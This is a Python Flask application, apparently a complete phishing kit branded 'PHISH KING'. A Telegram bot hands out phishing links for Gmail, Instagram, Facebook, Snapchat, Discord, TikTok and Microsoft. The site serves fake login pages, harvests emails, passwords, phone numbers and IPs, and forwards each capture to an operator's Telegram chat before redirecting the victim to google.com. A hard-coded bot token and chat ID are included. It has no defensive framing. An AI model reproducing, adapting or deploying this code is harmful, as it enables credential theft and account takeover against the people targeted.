from flask import Flask, request, render_template_string
import os
import requests
import threading
import time
import json

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}
running = True
last_update_id = 0

def send_msg(chat_id, text, reply_markup=None):
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        data['reply_markup'] = json.dumps(reply_markup)
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=5)

def answer_callback(query_id):
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", 
                 data={'callback_query_id': query_id}, timeout=5)

def bot_loop():
    global last_update_id
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
                              params={'offset': last_update_id + 1, 'timeout': 20}).json()
            if resp['ok']:
                for update in resp['result']:
                    last_update_id = update['update_id']
                    
                    # MESSAGE HANDLER
                    if 'message' in update:
                        msg = update['message']
                        cid = msg['chat']['id']
                        txt = msg.get('text', '').lower().strip()
                        uid = msg['from']['id']
                        
                        if '/start' in txt:
                            markup = {
                                'inline_keyboard': [
                                    [{'text': '📧 GMAIL', 'callback_data': f"gmail_{uid}"}],
                                    [{'text': '📸 INSTAGRAM', 'callback_data': f"insta_{uid}"}],
                                    [{'text': '📘 FACEBOOK', 'callback_data': f"fb_{uid}"}],
                                    [{'text': '👻 SNAPCHAT', 'callback_data': f"snap_{uid}"}],
                                    [{'text': '💬 DISCORD', 'callback_data': f"discord_{uid}"}],
                                    [{'text': '🎵 TIKTOK', 'callback_data': f"tiktok_{uid}"}],
                                    [{'text': '🔐 MICROSOFT', 'callback_data': f"ms_{uid}"}]
                                ]
                            }
                            send_msg(cid, 
                                    f"🎉 <b>WELCOME TO PHISH KING! 👑</b>\n\n"
                                    f"🔥 <b>7 Premium Services Ready!</b>\n\n"
                                    f"👇 <b>Click any button below</b>\n"
                                    f"📱 Perfect mobile phishing\n"
                                    f"💎 Capture email+pass+phone\n\n"
                                    f"<i>Powered by SparkStream</i>", markup)
                    
                    # CALLBACK HANDLER - WORKING 100%
                    if 'callback_query' in update:
                        query = update['callback_query']
                        query_id = query['id']
                        cid = query['from']['id']
                        data = query['data']
                        
                        answer_callback(query_id)
                        
                        # GENERATE LINKS
                        if data.startswith('gmail_'):
                            uid = data.split('_')[1]
                            url = f"https://myphish.onrender.com/phish/gmail/{uid}"
                            send_msg(cid, f"✅ <b>GMAIL PHISHING READY!</b>\n\n"
                                         f"🔗 <code>{url}</code>\n\n"
                                         f"📱 Copy & Send!")
                        
                        elif data.startswith('insta_'):
                            uid = data.split('_')[1]
                            url = f"https://myphish.onrender.com/phish/instagram/{uid}"
                            send_msg(cid, f"✅ <b>INSTAGRAM PHISHING READY!</b>\n\n"
                                         f"🔗 <code>{url}</code>\n\n"
                                         f"📱 Copy & Send!")
                        
                        elif data.startswith('fb_'):
                            uid = data.split('_')[1]
                            url = f"https://myphish.onrender.com/phish/facebook/{uid}"
                            send_msg(cid, f"✅ <b>FACEBOOK PHISHING READY!</b>\n\n"
                                         f"🔗 <code>{url}</code>\n\n"
                                         f"📱 Copy & Send!")
                        
                        elif data.startswith('snap_'):
                            uid = data.split('_')[1]
                            url = f"https://myphish.onrender.com/phish/snapchat/{uid}"
                            send_msg(cid, f"✅ <b>SNAPCHAT PHISHING READY!</b>\n\n"
                                         f"🔗 <code>{url}</code>\n\n"
                                         f"📱 Copy & Send!")
                        
                        elif data.startswith('discord_'):
                            uid = data.split('_')[1]
                            url = f"https://myphish.onrender.com/phish/discord/{uid}"
                            send_msg(cid, f"✅ <b>DISCORD PHISHING READY!</b>\n\n"
                                         f"🔗 <code>{url}</code>\n\n"
                                         f"📱 Copy & Send!")
                        
                        elif data.startswith('tiktok_'):
                            uid = data.split('_')[1]
                            url = f"https://myphish.onrender.com/phish/tiktok/{uid}"
                            send_msg(cid, f"✅ <b>TIKTOK PHISHING READY!</b>\n\n"
                                         f"🔗 <code>{url}</code>\n\n"
                                         f"📱 Copy & Send!")
                        
                        elif data.startswith('ms_'):
                            uid = data.split('_')[1]
                            url = f"https://myphish.onrender.com/phish/microsoft/{uid}"
                            send_msg(cid, f"✅ <b>MICROSOFT PHISHING READY!</b>\n\n"
                                         f"🔗 <code>{url}</code>\n\n"
                                         f"📱 Copy & Send!")
                        
        except: pass
        time.sleep(1)

@app.route('/')
def home():
    return f"<h1>🎣 PHISH KING LIVE!</h1><h2>Total Visits: {STATS['visits']} | Hits: {STATS['captures']}</h2>"

@app.route('/phish/<service>/<int:user_id>')
def phish(service, user_id):
    STATS['visits'] += 1
    service_map = {
        'gmail': 'Gmail', 'instagram': 'Instagram', 'facebook': 'Facebook',
        'snapchat': 'Snapchat', 'discord': 'Discord', 'tiktok': 'TikTok',
        'microsoft': 'Microsoft'
    }
    service_name = service_map.get(service, service.title())
    return render_template_string(LOGIN_TEMPLATE, service=service_name)

@app.route('/phish/<service>/<int:user_id>', methods=['POST'])
def capture(service, user_id):
    global STATS
    STATS['captures'] += 1
    data = {
        'email': request.form.get('email', 'N/A'),
        'pass': request.form.get('password', 'N/A'),
        'phone': request.form.get('phone', 'N/A'),
        'service': service.upper(),
        'ip': request.remote_addr
    }
    PHISHING_DATA.append(data)
    
    if ADMIN_CHAT_ID:
        send_msg(int(ADMIN_CHAT_ID), f"🎣 <b>NEW HIT - {data['service']}</b>\n"
                                   f"📧 <code>{data['email']}</code>\n"
                                   f"🔑 <code>{data['pass']}</code>\n"
                                   f"📱 <code>{data['phone']}</code>")
    
    return '''
    <!DOCTYPE html>
    <html><body style="background:#28a745;color:white;font-family:Arial;text-align:center;padding:50px;">
    <h1>✅ Verified Successfully!</h1>
    <p>Redirecting to service...</p>
    <script>setTimeout(()=>window.location="https://google.com",2000);</script>
    </body></html>
    '''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html><head><title>{{service}}</title>
<meta name="viewport" content="width=device-width">
<style>body{margin:0;padding:50px 20px;background:linear-gradient(135deg,#667eea,#764ba2);font-family:Arial;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center}
.box{background:#fff;border-radius:20px;padding:40px;box-shadow:0 20px 40px rgba(0,0,0,0.2);max-width:380px;width:100%;text-align:center}
h1{font-size:28px;margin:0 0 20px}
.tag{color:#666;margin-bottom:30px}
input{width:100%;padding:16px;margin:10px 0;border:2px solid #ddd;border-radius:12px;box-sizing:border-box;font-size:16px}
input:focus{outline:none;border-color:#667eea}
.btn{width:100%;padding:16px;background:#667eea;color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer;font-weight:bold}
.btn:hover{background:#5a67d8}
</style></head>
<body>
<div class="box">
<h1>🔐 {{service}} Login</h1>
<p class="tag">Enter your credentials</p>
<form method="POST">
<input name="email" placeholder="Email / Username *" type="email" required>
<input name="password" placeholder="Password *" type="password" required>
<input name="phone" placeholder="Phone Number">
<input name="user_id" type="hidden" value="{{user_id}}">
<input name="service" type="hidden" value="{{service}}">
<button class="btn">🔓 Verify Account</button>
</form>
</div>
</body></html>
'''

if __name__ == '__main__':
    threading.Thread(target=bot_loop, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
